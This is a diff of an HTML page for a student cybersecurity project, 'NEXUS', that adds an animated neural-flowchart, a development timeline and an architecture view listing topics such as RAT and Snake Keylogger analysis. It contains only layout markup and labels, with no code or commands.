+        <div id="neural-flowchart" class="flowchart-mode bg-gradient-to-br from-emerald-900/30 via-cyan-900/20 to-blue-900/30 backdrop-blur-sm rounded-3xl p-12 border border-emerald-500/40 mb-16 relative overflow-hidden">
+            <!-- Network Grid Background -->
+            <div class="absolute inset-0 opacity-10">
+                <div class="neural-grid"></div>
+            </div>
+            
+            <div class="relative z-10">
+                <h2 class="text-4xl font-bold text-center mb-12">
+                    <span class="bg-gradient-to-r from-emerald-400 to-cyan-400 bg-clip-text text-transparent">
+                        🧠 NEXUS Neural Architecture
+                    </span>
+                </h2>
+
+                <!-- Central Hub -->
+                <div class="flex justify-center mb-16">
+                    <div class="nexus-core relative">
+                        <div class="w-40 h-40 bg-gradient-to-r from-emerald-500 via-cyan-500 to-blue-500 rounded-full flex items-center justify-center relative animate-pulse-glow">
+                            <div class="w-32 h-32 bg-gray-900 rounded-full flex items-center justify-center relative">
+                                <i class="fas fa-atom text-4xl text-emerald-400 animate-spin-slow"></i>
+                                <div class="absolute inset-0 border-2 border-dashed border-cyan-400/50 rounded-full animate-reverse-spin"></div>
+                            </div>
+                            <!-- Orbital Rings -->
+                            <div class="absolute inset-0 border-2 border-emerald-400/30 rounded-full animate-pulse"></div>
+                            <div class="absolute inset-2 border border-cyan-400/20 rounded-full animate-pulse" style="animation-delay: 0.5s"></div>
+                        </div>
+                        
+                        <!-- Central Label -->
+                        <div class="absolute -bottom-12 left-1/2 transform -translate-x-1/2 text-center">
+                            <h3 class="text-xl font-bold text-emerald-400">NEXUS CORE</h3>
+                            <p class="text-sm text-gray-400">Central Processing Hub</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Neural Connections Grid -->
+                <div class="grid grid-cols-1 lg:grid-cols-3 gap-12 relative">
+                    <!-- First Semester Neural Node -->
+                    <div class="neural-node group relative">
+                        <div class="connection-line connection-to-center"></div>
+                        <div class="bg-gradient-to-br from-blue-900/50 to-cyan-900/50 backdrop-blur-sm rounded-2xl p-8 border border-blue-500/40 relative overflow-hidden hover:border-blue-400/80 transition-all duration-500 transform hover:scale-105">
+                            <!-- Flowing Data Streams -->
+                            <div class="absolute inset-0 opacity-20">
+                                <div class="data-stream stream-1"></div>
+                                <div class="data-stream stream-2"></div>
+                                <div class="data-stream stream-3"></div>
+                            </div>
+                            
+                            <div class="relative z-10">
+                                <div class="flex items-center justify-center mb-6">
+                                    <div class="w-20 h-20 bg-gradient-to-r from-blue-500 to-cyan-500 rounded-full flex items-center justify-center relative">
+                                        <i class="fas fa-shield-alt text-white text-2xl"></i>
+                                        <div class="absolute inset-0 border-2 border-blue-400/50 rounded-full animate-ping"></div>
+                                    </div>
+                                </div>
+                                
+                                <h3 class="text-2xl font-bold text-blue-400 mb-6 text-center">SEMESTER 1 NODE</h3>
+                                
+                                <!-- Interactive Neural Connections -->
+                                <div class="space-y-4">
+                                    <div class="neural-connection group/connection">
+                                        <div class="connection-indicator"></div>
+                                        <div class="flex items-center">
+                                            <i class="fas fa-lock text-cyan-400 mr-3 text-lg"></i>
+                                            <div>
+                                                <span class="text-gray-200 font-semibold">Encryption Fundamentals</span>
+                                                <div class="w-full bg-gray-700 rounded-full h-2 mt-1">
+                                                    <div class="bg-gradient-to-r from-cyan-500 to-blue-500 h-2 rounded-full w-3/4 animate-pulse"></div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="neural-connection group/connection">
+                                        <div class="connection-indicator"></div>
+                                        <div class="flex items-center">
+                                            <i class="fas fa-search-plus text-purple-400 mr-3 text-lg"></i>
+                                            <div>
+                                                <span class="text-gray-200 font-semibold">RAT Analysis</span>
+                                                <div class="w-full bg-gray-700 rounded-full h-2 mt-1">
+                                                    <div class="bg-gradient-to-r from-purple-500 to-pink-500 h-2 rounded-full w-4/5 animate-pulse"></div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="neural-connection group/connection">
+                                        <div class="connection-indicator"></div>
+                                        <div class="flex items-center">
+                                            <i class="fas fa-keyboard text-red-400 mr-3 text-lg"></i>
+                                            <div>
+                                                <span class="text-gray-200 font-semibold">Snake Keylogger</span>
+                                                <div class="w-full bg-gray-700 rounded-full h-2 mt-1">
+                                                    <div class="bg-gradient-to-r from-red-500 to-orange-500 h-2 rounded-full w-full animate-pulse"></div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="neural-connection group/connection">
+                                        <div class="connection-indicator active"></div>
+                                        <div class="flex items-center">
+                                            <i class="fas fa-project-diagram text-emerald-400 mr-3 text-lg"></i>
+                                            <div>
+                                                <span class="text-emerald-400 font-semibold">Neural Flowchart</span>
+                                                <div class="w-full bg-gray-700 rounded-full h-2 mt-1">
+                                                    <div class="bg-gradient-to-r from-emerald-500 to-cyan-500 h-2 rounded-full w-full animate-pulse-bright"></div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Future Development Neural Node -->
+                    <div class="neural-node group relative">
+                        <div class="connection-line connection-to-center"></div>
+                        <div class="bg-gradient-to-br from-purple-900/50 to-pink-900/50 backdrop-blur-sm rounded-2xl p-8 border border-purple-500/40 relative overflow-hidden hover:border-purple-400/80 transition-all duration-500 transform hover:scale-105">
+                            <!-- Quantum Field Effects -->
+                            <div class="absolute inset-0 opacity-15">
+                                <div class="quantum-field"></div>
+                            </div>
+                            
+                            <div class="relative z-10">
+                                <div class="flex items-center justify-center mb-6">
+                                    <div class="w-20 h-20 bg-gradient-to-r from-purple-500 to-pink-500 rounded-full flex items-center justify-center relative">
+                                        <i class="fas fa-rocket text-white text-2xl"></i>
+                                        <div class="absolute inset-0 border-2 border-purple-400/50 rounded-full animate-ping"></div>
+                                    </div>
+                                </div>
+                                
+                                <h3 class="text-2xl font-bold text-purple-400 mb-6 text-center">FUTURE NODE</h3>
+                                
+                                <div class="space-y-4">
+                                    <div class="neural-connection group/connection">
+                                        <div class="connection-indicator pending"></div>
+                                        <div class="flex items-center">
+                                            <i class="fas fa-brain text-purple-400 mr-3 text-lg"></i>
+                                            <div>
+                                                <span class="text-gray-200 font-semibold">AI-Powered Security</span>
+                                                <div class="w-full bg-gray-700 rounded-full h-2 mt-1">
+                                                    <div class="bg-gradient-to-r from-purple-500 to-pink-500 h-2 rounded-full w-1/4 animate-pulse"></div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="neural-connection group/connection">
+                                        <div class="connection-indicator pending"></div>
+                                        <div class="flex items-center">
+                                            <i class="fas fa-cloud text-cyan-400 mr-3 text-lg"></i>
+                                            <div>
+                                                <span class="text-gray-200 font-semibold">Cloud Integration</span>
+                                                <div class="w-full bg-gray-700 rounded-full h-2 mt-1">
+                                                    <div class="bg-gradient-to-r from-cyan-500 to-blue-500 h-2 rounded-full w-1/3 animate-pulse"></div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="neural-connection group/connection">
+                                        <div class="connection-indicator pending"></div>
+                                        <div class="flex items-center">
+                                            <i class="fas fa-globe text-emerald-400 mr-3 text-lg"></i>
+                                            <div>
+                                                <span class="text-gray-200 font-semibold">Global Network</span>
+                                                <div class="w-full bg-gray-700 rounded-full h-2 mt-1">
+                                                    <div class="bg-gradient-to-r from-emerald-500 to-teal-500 h-2 rounded-full w-1/5 animate-pulse"></div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- NEXUS x MYC Game Neural Node -->
+                    <div class="neural-node group relative">
+                        <div class="connection-line connection-to-center"></div>
+                        <div class="bg-gradient-to-br from-cyan-900/50 to-teal-900/50 backdrop-blur-sm rounded-2xl p-8 border border-cyan-500/40 relative overflow-hidden hover:border-cyan-400/80 transition-all duration-500 transform hover:scale-105">
+                            <!-- Game Field Effects -->
+                            <div class="absolute inset-0 opacity-15">
+                                <div class="game-particles"></div>
+                            </div>
+                            
+                            <div class="relative z-10">
+                                <div class="flex items-center justify-center mb-6">
+                                    <div class="w-20 h-20 bg-gradient-to-r from-cyan-500 to-teal-500 rounded-full flex items-center justify-center relative">
+                                        <i class="fas fa-gamepad text-white text-2xl"></i>
+                                        <div class="absolute inset-0 border-2 border-cyan-400/50 rounded-full animate-ping"></div>
+                                    </div>
+                                </div>
+                                
+                                <h3 class="text-2xl font-bold bg-gradient-to-r from-cyan-400 to-teal-400 bg-clip-text text-transparent mb-6 text-center">MYC GAME NODE</h3>
+                                
+                                <div class="space-y-4">
+                                    <div class="neural-connection group/connection">
+                                        <div class="connection-indicator"></div>
+                                        <div class="flex items-center">
+                                            <i class="fas fa-puzzle-piece text-cyan-400 mr-3 text-lg"></i>
+                                            <div>
+                                                <span class="text-gray-200 font-semibold">Interactive Learning</span>
+                                                <div class="w-full bg-gray-700 rounded-full h-2 mt-1">
+                                                    <div class="bg-gradient-to-r from-cyan-500 to-teal-500 h-2 rounded-full w-4/5 animate-pulse"></div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="neural-connection group/connection">
+                                        <div class="connection-indicator"></div>
+                                        <div class="flex items-center">
+                                            <i class="fas fa-clock text-pink-400 mr-3 text-lg"></i>
+                                            <div>
+                                                <span class="text-gray-200 font-semibold">Time Travel Engine</span>
+                                                <div class="w-full bg-gray-700 rounded-full h-2 mt-1">
+                                                    <div class="bg-gradient-to-r from-pink-500 to-purple-500 h-2 rounded-full w-3/5 animate-pulse"></div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="neural-connection group/connection">
+                                        <div class="connection-indicator"></div>
+                                        <div class="flex items-center">
+                                            <i class="fas fa-users text-emerald-400 mr-3 text-lg"></i>
+                                            <div>
+                                                <span class="text-gray-200 font-semibold">Collaborative Hub</span>
+                                                <div class="w-full bg-gray-700 rounded-full h-2 mt-1">
+                                                    <div class="bg-gradient-to-r from-emerald-500 to-cyan-500 h-2 rounded-full w-2/3 animate-pulse"></div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Neural Network Stats -->
+                <div class="mt-16 grid grid-cols-1 md:grid-cols-4 gap-6">
+                    <div class="neural-stat bg-emerald-900/30 border border-emerald-500/30 rounded-xl p-6 text-center">
+                        <div class="text-3xl font-bold text-emerald-400">100%</div>
+                        <div class="text-sm text-gray-400">Neural Connectivity</div>
+                        <div class="w-full bg-gray-700 rounded-full h-2 mt-2">
+                            <div class="bg-emerald-500 h-2 rounded-full w-full animate-pulse"></div>
+                        </div>
+                    </div>
+                    
+                    <div class="neural-stat bg-cyan-900/30 border border-cyan-500/30 rounded-xl p-6 text-center">
+                        <div class="text-3xl font-bold text-cyan-400">4</div>
+                        <div class="text-sm text-gray-400">Active Nodes</div>
+                        <div class="w-full bg-gray-700 rounded-full h-2 mt-2">
+                            <div class="bg-cyan-500 h-2 rounded-full w-4/5 animate-pulse"></div>
+                        </div>
+                    </div>
+                    
+                    <div class="neural-stat bg-purple-900/30 border border-purple-500/30 rounded-xl p-6 text-center">
+                        <div class="text-3xl font-bold text-purple-400">∞</div>
+                        <div class="text-sm text-gray-400">Scalability</div>
+                        <div class="w-full bg-gray-700 rounded-full h-2 mt-2">
+                            <div class="bg-purple-500 h-2 rounded-full w-full animate-pulse"></div>
+                        </div>
+                    </div>
+                    
+                    <div class="neural-stat bg-pink-900/30 border border-pink-500/30 rounded-xl p-6 text-center">
+                        <div class="text-3xl font-bold text-pink-400">2025</div>
+                        <div class="text-sm text-gray-400">Future Ready</div>
+                        <div class="w-full bg-gray-700 rounded-full h-2 mt-2">
+                            <div class="bg-pink-500 h-2 rounded-full w-full animate-pulse"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Interactive Timeline View -->
+        <div id="timeline-flowchart" class="flowchart-mode hidden bg-gradient-to-br from-cyan-900/30 via-blue-900/20 to-purple-900/30 backdrop-blur-sm rounded-3xl p-12 border border-cyan-500/40 mb-16 relative overflow-hidden">
+            <div class="relative z-10">
+                <h2 class="text-4xl font-bold text-center mb-12">
+                    <span class="bg-gradient-to-r from-cyan-400 to-blue-400 bg-clip-text text-transparent">
+                        🕒 NEXUS Development Timeline
+                    </span>
+                </h2>
+
+                <!-- Timeline Container -->
+                <div class="relative">
+                    <!-- Central Timeline Line -->
+                    <div class="absolute left-1/2 transform -translate-x-1/2 w-1 h-full bg-gradient-to-b from-cyan-500 via-blue-500 to-purple-500 rounded-full"></div>
+                    
+                    <div class="space-y-16">
+                        <!-- Phase 1: Foundation -->
+                        <div class="timeline-item flex items-center relative">
+                            <div class="flex-1 pr-8 text-right">
+                                <div class="bg-cyan-900/50 rounded-xl p-6 border border-cyan-500/30">
+                                    <h3 class="text-xl font-bold text-cyan-400 mb-3">Phase 1: Foundation</h3>
+                                    <p class="text-gray-300 text-sm mb-3">Establishing core security concepts and fundamental analysis techniques</p>
+                                    <div class="space-y-2 text-xs text-gray-400">
+                                        <div>• Encryption Research & Implementation</div>
+                                        <div>• RAT Malware Deep Analysis</div>
+                                        <div>• Security Framework Development</div>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div class="timeline-node">
+                                <div class="w-16 h-16 bg-gradient-to-r from-cyan-500 to-blue-500 rounded-full flex items-center justify-center border-4 border-cyan-400/50">
+                                    <i class="fas fa-foundation text-white text-xl"></i>
+                                </div>
+                            </div>
+                            
+                            <div class="flex-1 pl-8">
+                                <div class="text-sm text-gray-400">
+                                    <div>Duration: First Semester</div>
+                                    <div>Status: <span class="text-emerald-400">✓ Completed</span></div>
+                                    <div>Progress: 100%</div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Phase 2: Advanced Analysis -->
+                        <div class="timeline-item flex items-center relative">
+                            <div class="flex-1 pr-8 text-right">
+                                <div class="text-sm text-gray-400">
+                                    <div>Duration: Current Phase</div>
+                                    <div>Status: <span class="text-yellow-400">⚡ Active</span></div>
+                                    <div>Progress: 85%</div>
+                                </div>
+                            </div>
+                            
+                            <div class="timeline-node">
+                                <div class="w-16 h-16 bg-gradient-to-r from-orange-500 to-red-500 rounded-full flex items-center justify-center border-4 border-orange-400/50 animate-pulse">
+                                    <i class="fas fa-microscope text-white text-xl"></i>
+                                </div>
+                            </div>
+                            
+                            <div class="flex-1 pl-8">
+                                <div class="bg-orange-900/50 rounded-xl p-6 border border-orange-500/30">
+                                    <h3 class="text-xl font-bold text-orange-400 mb-3">Phase 2: Advanced Analysis</h3>
+                                    <p class="text-gray-300 text-sm mb-3">Deep-dive malware analysis and sophisticated attack vector research</p>
+                                    <div class="space-y-2 text-xs text-gray-400">
+                                        <div>• Snake Keylogger Reverse Engineering</div>
+                                        <div>• Neural Network Flowchart Design</div>
+                                        <div>• Interactive Visualization Development</div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Phase 3: Game Integration -->
+                        <div class="timeline-item flex items-center relative">
+                            <div class="flex-1 pr-8 text-right">
+                                <div class="bg-purple-900/50 rounded-xl p-6 border border-purple-500/30">
+                                    <h3 class="text-xl font-bold text-purple-400 mb-3">Phase 3: Game Integration</h3>
+                                    <p class="text-gray-300 text-sm mb-3">Merging educational content with interactive gaming experience</p>
+                                    <div class="space-y-2 text-xs text-gray-400">
+                                        <div>• NEXUS x MYC Platform Integration</div>
+                                        <div>• Time Travel Learning Scenarios</div>
+                                        <div>• Collaborative Mission Framework</div>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div class="timeline-node">
+                                <div class="w-16 h-16 bg-gradient-to-r from-purple-500 to-pink-500 rounded-full flex items-center justify-center border-4 border-purple-400/50">
+                                    <i class="fas fa-gamepad text-white text-xl"></i>
+                                </div>
+                            </div>
+                            
+                            <div class="flex-1 pl-8">
+                                <div class="text-sm text-gray-400">
+                                    <div>Duration: Next Semester</div>
+                                    <div>Status: <span class="text-cyan-400">🔄 Planned</span></div>
+                                    <div>Progress: 30%</div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Phase 4: Research Publication -->
+                        <div class="timeline-item flex items-center relative">
+                            <div class="flex-1 pr-8 text-right">
+                                <div class="text-sm text-gray-400">
+                                    <div>Duration: Final Phase</div>
+                                    <div>Status: <span class="text-blue-400">📋 Future</span></div>
+                                    <div>Progress: 10%</div>
+                                </div>
+                            </div>
+                            
+                            <div class="timeline-node">
+                                <div class="w-16 h-16 bg-gradient-to-r from-emerald-500 to-teal-500 rounded-full flex items-center justify-center border-4 border-emerald-400/50">
+                                    <i class="fas fa-trophy text-white text-xl"></i>
+                                </div>
+                            </div>
+                            
+                            <div class="flex-1 pl-8">
+                                <div class="bg-emerald-900/50 rounded-xl p-6 border border-emerald-500/30">
+                                    <h3 class="text-xl font-bold text-emerald-400 mb-3">Phase 4: Research Publication</h3>
+                                    <p class="text-gray-300 text-sm mb-3">Academic research compilation and knowledge sharing</p>
+                                    <div class="space-y-2 text-xs text-gray-400">
+                                        <div>• Comprehensive Research Documentation</div>
+                                        <div>• Academic Paper Publication</div>
+                                        <div>• Community Knowledge Sharing</div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Architecture Diagram View -->
+        <div id="architecture-flowchart" class="flowchart-mode hidden bg-gradient-to-br from-purple-900/30 via-pink-900/20 to-red-900/30 backdrop-blur-sm rounded-3xl p-12 border border-purple-500/40 mb-16 relative overflow-hidden">
+            <div class="relative z-10">
+                <h2 class="text-4xl font-bold text-center mb-12">
+                    <span class="bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent">
+                        🏗️ NEXUS System Architecture
+                    </span>
+                </h2>
+
+                <!-- Architecture Layers -->
+                <div class="space-y-8">
+                    <!-- Presentation Layer -->
+                    <div class="architecture-layer bg-blue-900/40 rounded-2xl p-8 border border-blue-500/30">
+                        <h3 class="text-2xl font-bold text-blue-400 mb-6 text-center">
+                            <i class="fas fa-desktop mr-3"></i>Presentation Layer
+                        </h3>
+                        <div class="grid grid-cols-1 md:grid-cols-4 gap-4">
+                            <div class="architecture-component bg-cyan-900/50 rounded-lg p-4 border border-cyan-500/30">
+                                <i class="fas fa-palette text-cyan-400 text-xl mb-2"></i>
+                                <h4 class="font-semibold text-cyan-400">Frontend UI</h4>
+                                <p class="text-xs text-gray-400">Responsive interface design</p>
+                            </div>
+                            <div class="architecture-component bg-blue-900/50 rounded-lg p-4 border border-blue-500/30">
+                                <i class="fas fa-mobile-alt text-blue-400 text-xl mb-2"></i>
+                                <h4 class="font-semibold text-blue-400">Mobile Views</h4>
+                                <p class="text-xs text-gray-400">Cross-platform compatibility</p>
+                            </div>
+                            <div class="architecture-component bg-purple-900/50 rounded-lg p-4 border border-purple-500/30">
+                                <i class="fas fa-paint-brush text-purple-400 text-xl mb-2"></i>
+                                <h4 class="font-semibold text-purple-400">Theme Engine</h4>
+                                <p class="text-xs text-gray-400">Dynamic styling system</p>
+                            </div>
+                            <div class="architecture-component bg-pink-900/50 rounded-lg p-4 border border-pink-500/30">
+                                <i class="fas fa-gamepad text-pink-400 text-xl mb-2"></i>
+                                <h4 class="font-semibold text-pink-400">Game Interface</h4>
+                                <p class="text-xs text-gray-400">Interactive learning modules</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Application Layer -->
+                    <div class="architecture-layer bg-green-900/40 rounded-2xl p-8 border border-green-500/30">
+                        <h3 class="text-2xl font-bold text-green-400 mb-6 text-center">
+                            <i class="fas fa-cogs mr-3"></i>Application Layer
+                        </h3>
+                        <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                            <div class="architecture-component bg-emerald-900/50 rounded-lg p-4 border border-emerald-500/30">
+                                <i class="fas fa-shield-alt text-emerald-400 text-xl mb-2"></i>
+                                <h4 class="font-semibold text-emerald-400">Security Core</h4>
+                                <p class="text-xs text-gray-400">Malware analysis engine</p>
+                            </div>
+                            <div class="architecture-component bg-teal-900/50 rounded-lg p-4 border border-teal-500/30">
+                                <i class="fas fa-brain text-teal-400 text-xl mb-2"></i>
+                                <h4 class="font-semibold text-teal-400">Neural Network</h4>
+                                <p class="text-xs text-gray-400">AI-powered processing</p>
+                            </div>
+                            <div class="architecture-component bg-green-900/50 rounded-lg p-4 border border-green-500/30">
+                                <i class="fas fa-puzzle-piece text-green-400 text-xl mb-2"></i>
+                                <h4 class="font-semibold text-green-400">Game Engine</h4>
+                                <p class="text-xs text-gray-400">Educational gameplay logic</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Data Layer -->
+                    <div class="architecture-layer bg-orange-900/40 rounded-2xl p-8 border border-orange-500/30">
+                        <h3 class="text-2xl font-bold text-orange-400 mb-6 text-center">
+                            <i class="fas fa-database mr-3"></i>Data Layer
+                        </h3>
+                        <div class="grid grid-cols-1 md:grid-cols-4 gap-4">
+                            <div class="architecture-component bg-red-900/50 rounded-lg p-4 border border-red-500/30">
+                                <i class="fas fa-bug text-red-400 text-xl mb-2"></i>
+                                <h4 class="font-semibold text-red-400">Malware Samples</h4>
+                                <p class="text-xs text-gray-400">Secure specimen storage</p>
+                            </div>
+                            <div class="architecture-component bg-yellow-900/50 rounded-lg p-4 border border-yellow-500/30">
+                                <i class="fas fa-chart-bar text-yellow-400 text-xl mb-2"></i>
+                                <h4 class="font-semibold text-yellow-400">Analytics Data</h4>
+                                <p class="text-xs text-gray-400">Research metrics & stats</p>
+                            </div>
+                            <div class="architecture-component bg-orange-900/50 rounded-lg p-4 border border-orange-500/30">
+                                <i class="fas fa-users text-orange-400 text-xl mb-2"></i>
+                                <h4 class="font-semibold text-orange-400">User Profiles</h4>
+                                <p class="text-xs text-gray-400">Learning progress tracking</p>
+                            </div>
+                            <div class="architecture-component bg-pink-900/50 rounded-lg p-4 border border-pink-500/30">
+                                <i class="fas fa-trophy text-pink-400 text-xl mb-2"></i>
+                                <h4 class="font-semibold text-pink-400">Achievement System</h4>
+                                <p class="text-xs text-gray-400">Gamification data</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- System Metrics -->
+                <div class="mt-12 grid grid-cols-2 md:grid-cols-4 gap-4">
+                    <div class="metric-card bg-purple-900/50 rounded-lg p-4 text-center border border-purple-500/30">
+                        <div class="text-2xl font-bold text-purple-400">99.9%</div>
+                        <div class="text-xs text-gray-400">System Uptime</div>
+                    </div>
+                    <div class="metric-card bg-pink-900/50 rounded-lg p-4 text-center border border-pink-500/30">
+                        <div class="text-2xl font-bold text-pink-400">< 100ms</div>
+                        <div class="text-xs text-gray-400">Response Time</div>
+                    </div>
+                    <div class="metric-card bg-cyan-900/50 rounded-lg p-4 text-center border border-cyan-500/30">
+                        <div class="text-2xl font-bold text-cyan-400">∞</div>
+                        <div class="text-xs text-gray-400">Scalability</div>
+                    </div>
+                    <div class="metric-card bg-emerald-900/50 rounded-lg p-4 text-center border border-emerald-500/30">
+                        <div class="text-2xl font-bold text-emerald-400">🔒</div>
+                        <div class="text-xs text-gray-400">Security Level</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Call to Action Section -->
+        <div class="bg-gradient-to-r from-emerald-900/30 via-cyan-900/20 to-blue-900/30 backdrop-blur-sm rounded-2xl p-8 border border-emerald-500/40 text-center">
+            <h3 class="text-3xl font-bold text-white mb-4">
+                <span class="bg-gradient-to-r from-emerald-400 to-cyan-400 bg-clip-text text-transparent">
+                    🚀 Ready to Explore the NEXUS?
                 </span>
-            </h1>
-            <p class="text-xl text-gray-300 max-w-3xl mx-auto leading-relaxed mb-8">
-                Interactive visualization of the complete NEXUS project methodology, workflow, and architectural design.
+            </h3>
+            <p class="text-gray-300 mb-8 max-w-2xl mx-auto">
+                Dive deeper into each component of the NEXUS ecosystem and discover the interconnected world of cybersecurity research, 
+                interactive learning, and cutting-edge technology.
             </p>
-        </div>
-
-        <!-- Project Architecture Overview -->
-        <div class="bg-white/5 backdrop-blur-sm rounded-2xl p-8 border border-green-500/20 mb-16">
-            <h3 class="text-2xl font-bold text-white mb-8 text-center">NEXUS Project Architecture</h3>
-            <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
-                <!-- First Semester -->
-                <div class="bg-gray-800/50 rounded-xl p-6 border border-blue-500/30">
-                    <div class="flex items-center mb-4">
-                        <div class="w-12 h-12 bg-gradient-to-r from-blue-500 to-cyan-500 rounded-full flex items-center justify-center mr-4">
-                            <i class="fas fa-shield-alt text-white"></i>
-                        </div>
-                        <h4 class="text-blue-400 font-bold text-lg">First Semester</h4>
-                    </div>
-                    <div class="space-y-3">
-                        <div class="flex items-center text-sm">
-                            <i class="fas fa-lock text-cyan-400 mr-2"></i>
-                            <span class="text-gray-300">Encryption Fundamentals</span>
-                        </div>
-                        <div class="flex items-center text-sm">
-                            <i class="fas fa-search-plus text-purple-400 mr-2"></i>
-                            <span class="text-gray-300">RAT Analysis</span>
-                        </div>
-                        <div class="flex items-center text-sm">
-                            <i class="fas fa-keyboard text-red-400 mr-2"></i>
-                            <span class="text-gray-300">Snake Keylogger</span>
-                        </div>
-                        <div class="flex items-center text-sm">
-                            <i class="fas fa-project-diagram text-green-400 mr-2"></i>
-                            <span class="text-gray-300">This Flowchart</span>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Second Semester -->
-                <div class="bg-gray-800/50 rounded-xl p-6 border border-purple-500/30">
-                    <div class="flex items-center mb-4">
-                        <div class="w-12 h-12 bg-gradient-to-r from-purple-500 to-pink-500 rounded-full flex items-center justify-center mr-4">
-                            <i class="fas fa-microscope text-white"></i>
-                        </div>
-                        <h4 class="text-purple-400 font-bold text-lg">Second Semester</h4>
-                    </div>
-                    <div class="space-y-3">
-                        <div class="flex items-center text-sm">
-                            <i class="fas fa-search text-purple-400 mr-2"></i>
-                            <span class="text-gray-300">Phase 1: Research</span>
-                        </div>
-                        <div class="flex items-center text-sm">
-                            <i class="fas fa-cogs text-pink-400 mr-2"></i>
-                            <span class="text-gray-300">Phase 2: Implementation</span>
-                        </div>
-                        <div class="flex items-center text-sm">
-                            <i class="fas fa-chart-line text-green-400 mr-2"></i>
-                            <span class="text-gray-300">Advanced Analysis</span>
-                        </div>
-                        <div class="flex items-center text-sm">
-                            <i class="fas fa-graduation-cap text-yellow-400 mr-2"></i>
-                            <span class="text-gray-300">Final Research</span>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- NEXUS x MYC Game -->
-                <div class="bg-gray-800/50 rounded-xl p-6 border border-cyan-500/30">
-                    <div class="flex items-center mb-4">
-                        <div class="w-12 h-12 bg-gradient-to-r from-cyan-500 to-pink-500 rounded-full flex items-center justify-center mr-4">
-                            <i class="fas fa-gamepad text-white"></i>
-                        </div>
-                        <h4 class="bg-gradient-to-r from-cyan-400 to-pink-400 bg-clip-text text-transparent font-bold text-lg">NEXUS x MYC</h4>
-                    </div>
-                    <div class="space-y-3">
-                        <div class="flex items-center text-sm">
-                            <i class="fas fa-puzzle-piece text-cyan-400 mr-2"></i>
-                            <span class="text-gray-300">Interactive Learning</span>
-                        </div>
-                        <div class="flex items-center text-sm">
-                            <i class="fas fa-clock text-pink-400 mr-2"></i>
-                            <span class="text-gray-300">Time Travel Scenarios</span>
-                        </div>
-                        <div class="flex items-center text-sm">
-                            <i class="fas fa-users text-purple-400 mr-2"></i>
-                            <span class="text-gray-300">Collaborative Missions</span>
-                        </div>
-                        <div class="flex items-center text-sm">
-                            <i class="fas fa-trophy text-yellow-400 mr-2"></i>
-                            <span class="text-gray-300">Achievement System</span>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <!-- Research Methodology Flowchart -->
-        <div class="bg-white/5 backdrop-blur-sm rounded-2xl p-8 border border-emerald-500/20 mb-16">
-            <h3 class="text-2xl font-bold text-white mb-8 text-center">Research Methodology Flow</h3>
-            <div class="grid grid-cols-1 md:grid-cols-5 gap-6">
-                <!-- Step 1 -->
-                <div class="text-center">
-                    <div class="w-20 h-20 bg-gradient-to-r from-blue-500 to-cyan-500 rounded-full flex items-center justify-center mx-auto mb-4 border-4 border-cyan-400/30">
-                        <i class="fas fa-lightbulb text-white text-xl"></i>
-                    </div>
-                    <h4 class="text-cyan-400 font-semibold mb-2">Problem Identification</h4>
-                    <p class="text-gray-300 text-xs">Identify cybersecurity challenges and research gaps</p>
-                    <div class="mt-4">
-                        <i class="fas fa-arrow-right text-gray-500 text-xl"></i>
-                    </div>
-                </div>
-
-                <!-- Step 2 -->
-                <div class="text-center">
-                    <div class="w-20 h-20 bg-gradient-to-r from-purple-500 to-pink-500 rounded-full flex items-center justify-center mx-auto mb-4 border-4 border-purple-400/30">
-                        <i class="fas fa-book text-white text-xl"></i>
-                    </div>
-                    <h4 class="text-purple-400 font-semibold mb-2">Literature Review</h4>
-                    <p class="text-gray-300 text-xs">Comprehensive analysis of existing research and methodologies</p>
-                    <div class="mt-4">
-                        <i class="fas fa-arrow-right text-gray-500 text-xl"></i>
-                    </div>
-                </div>
-
-                <!-- Step 3 -->
-                <div class="text-center">
-                    <div class="w-20 h-20 bg-gradient-to-r from-red-500 to-orange-500 rounded-full flex items-center justify-center mx-auto mb-4 border-4 border-red-400/30">
-                        <i class="fas fa-flask text-white text-xl"></i>
-                    </div>
-                    <h4 class="text-red-400 font-semibold mb-2">Experimentation</h4>
-                    <p class="text-gray-300 text-xs">Hands-on analysis, testing, and practical implementation</p>
-                    <div class="mt-4">
-                        <i class="fas fa-arrow-right text-gray-500 text-xl"></i>
-                    </div>
-                </div>
-
-                <!-- Step 4 -->
-                <div class="text-center">
